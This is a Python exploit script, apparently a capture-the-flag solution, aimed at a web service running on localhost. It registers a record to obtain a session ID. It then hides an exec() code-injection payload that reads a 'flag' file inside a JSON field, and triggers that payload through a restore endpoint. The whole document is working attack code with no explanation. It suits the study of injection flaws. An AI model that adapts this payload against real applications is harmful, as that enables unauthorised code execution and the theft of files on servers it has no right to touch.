import requests
import json

base_url = 'http://localhost:1337'

session = requests.Session()

angel_data = {
    "angel": {
        "name": "test",
        "actress": "test",
        "movie": "test",
        "talents": {}
    }
}

response = session.post(f"{base_url}/angel", json=angel_data)
if response.status_code == 200:
    session_id = response.text.strip()
    print(f"Obtained session ID: {session_id}")
else:
    print("Failed to create session")
    exit(1)

script_content = (
    """with open('flag', 'r') as file:\n"""
    """    content = file.read()\n"""
    """print(content.replace('csawctf', ''))"""
)

payload = {
    "angel": {
        "name": "Injection",
        "actress": "",
        "movie": "",
        "talents": {
            "exploit": f"exec('''{script_content}''')"
        }
    }
}

headers = {'Content-Type': 'application/json'}
response = session.post(f"{base_url}/angel", headers=headers, json=payload)
print("Backup upload response:", response.text)

if response.status_code != 200 or session_id not in response.text:
    print("Failed to upload script")
    exit(1)

restore_response = session.get(f"{base_url}/restore?id={session_id}")
print("Restore response:", restore_response.text)
